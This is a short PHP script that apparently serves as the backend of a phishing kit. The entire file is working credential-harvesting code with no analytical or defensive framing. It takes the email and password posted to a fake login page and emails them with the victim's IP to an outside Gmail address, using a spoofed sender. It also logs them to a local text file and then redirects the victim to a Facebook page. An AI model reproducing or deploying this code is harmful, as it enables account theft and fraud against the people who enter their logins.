<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['email'] != "") AND ($_POST['password'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "e:".$_POST['email']."";
$message .= " p:".$_POST['password']."\n";
$send = "bootetlgram@gmail.com";
$subject = "Dabour [CC] $ip ";
$headers = "From:<vodanjqy@vodafone-gb-net.website>";
mail($send,$subject,$message,$headers);

echo "<meta http-equiv='refresh' content='0; url=https://m.facebook.com/dabour.nullf.1/posts/171517021188683'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0;https://m.facebook.com/dabour.nullf.1/posts/171517021188683' />";
}
{
$file = fopen("elzzebda.txt", 'a');
fwrite($file, $message);
}
?>
